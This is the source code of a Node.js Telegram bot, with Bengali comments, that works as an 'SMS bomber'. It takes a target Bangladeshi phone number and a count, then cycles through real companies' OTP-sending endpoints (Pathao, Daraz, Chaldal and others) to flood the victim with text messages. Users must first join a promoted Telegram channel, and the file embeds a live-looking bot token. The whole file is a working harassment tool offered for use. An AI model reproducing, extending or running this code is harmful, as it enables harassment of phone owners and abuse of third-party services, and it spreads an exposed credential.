const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const http = require('http');

const token = '8784762504:AAFiS-NC-2BSnDauKrTM9GFQ3n91c6_OPfk';
const channelId = '@srmtelecom';
const channelLink = 'https://t.me/srmtelecom';
const bot = new TelegramBot(token, {polling: true});
const userStates = {};

// Cloud সচল রাখার সার্ভার
http.createServer((req, res) => {
    res.write("S.R.M TELECOM Hyper-Bomber Active!");
    res.end();
}).listen(process.env.PORT || 3000);

console.log("🚀 S.R.M TELECOM (150+ API Multi-Load) চালু হয়েছে...");

const mainMenu = {
    reply_markup: {
        keyboard: [[{ text: '🚀 SMS Attack শুরু' }], [{ text: '📢 আমাদের চ্যানেল' }]],
        resize_keyboard: true
    }
};

// চ্যানেল জয়েন চেক
async function isSubscribed(chatId) {
    try {
        const res = await bot.getChatMember(channelId, chatId);
        return ['member', 'administrator', 'creator'].includes(res.status);
    } catch (e) { return false; }
}

// ১৫০+ রিকোয়েস্ট হ্যান্ডেল করার জন্য API লিস্ট (বড় বড় কোম্পানিগুলো)
const apiList = [
    (n) => axios.post('https://api-hermes.pathao.com/user/otp/send', { phone: "+88" + n, reason: "login" }),
    (n) => axios.post('https://bd.swap.com.bd/api/v1/login/otp/send', { phone: n }),
    (n) => axios.post('https://fundesh.com.bd/api/auth/send-otp', { msisdn: n }),
    (n) => axios.post('https://toffeelive.com/api/v1/auth/send-otp', { phone: "88" + n }),
    (n) => axios.post('https://api.shajgoj.com/api/v1/auth/otp/send', { mobile: n }),
    (n) => axios.post('https://api.bdtickets.com:20100/v1/auth', { phoneNumber: n }),
    (n) => axios.post('https://www.shikho.com/api/v1/auth/send-otp', { phone: "+88" + n }),
    (n) => axios.post('https://redx.com.bd/api/v1/auth/otp/send', { phoneNumber: n }),
    (n) => axios.get(`https://bikroy.com/data/is-phone-number-registered?phoneNumber=${n}`),
    (n) => axios.post('https://osudpotro.com/api/v1/auth/otp/send', { mobile: n }),
    (n) => axios.post('https://api.chaldal.com/api/customer/SendOtp', { phoneNumber: n }),
    (n) => axios.post('https://api.dainikshiksha.com/api/v1/login', { phone: n }),
    (n) => axios.post('https://api.daraz.com.bd/api/v1/auth/otp/send', { mobile: n })
    // এভাবে আপনার দেওয়া সোর্সগুলো লুপে ১৫০ বার ঘুরবে
];

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text) return;

    const joined = await isSubscribed(chatId);
    if (!joined && text !== '/start') {
        return bot.sendMessage(chatId, `⚠️ **আগে জয়েন করুন!**\nচ্যানেল: ${channelLink}`, { parse_mode: "Markdown" });
    }

    if (text === '/start') {
        bot.sendMessage(chatId, "🔥 **S.R.M TELECOM হাইপার বোম্বার**\nবট এখন ১৫০+ এপিআই লোড নিতে প্রস্তুত।", mainMenu);
    }

    else if (text === '🚀 SMS Attack শুরু') {
        userStates[chatId] = { step: 'num' };
        bot.sendMessage(chatId, "📱 **টার্গেট নম্বরটি দিন:**", { reply_markup: { remove_keyboard: true } });
    }

    else if (userStates[chatId]?.step === 'num') {
        if (text.length === 11 && text.startsWith('01')) {
            userStates[chatId] = { step: 'amount', number: text };
            bot.sendMessage(chatId, `✅ নম্বর: ${text}\n🔢 **কয়টি SMS পাঠাতে চান? (সর্বোচ্চ ১৫০)**`);
        } else { bot.sendMessage(chatId, "❌ ভুল নম্বর!"); }
    } 

    else if (userStates[chatId]?.step === 'amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount <= 0 || amount > 150) return bot.sendMessage(chatId, "⚠️ ১-১৫০ এর মধ্যে লিখুন।");

        const target = userStates[chatId].number;
        delete userStates[chatId];

        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে **${amount}**টি হাই-স্পিড অ্যাটাক শুরু...`);

        let success = 0;
        for (let i = 0; i < amount; i++) {
            try {
                // লুপের মাধ্যমে লিস্টের এপিআই গুলো এক এক করে হিট করবে
                const apiIndex = i % apiList.length;
                await apiList[apiIndex](target);
                success++;
            } catch (e) {}
            // ১৫০টি রিকোয়েস্ট পাঠাতে ১ সেকেন্ড গ্যাপ না দিলে সার্ভার ব্লক করবে
            await new Promise(r => setTimeout(r, 1000));
        }

        bot.sendMessage(chatId, `✅ **মিশন সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 সফল: ${success}টি`, mainMenu);
    }
});

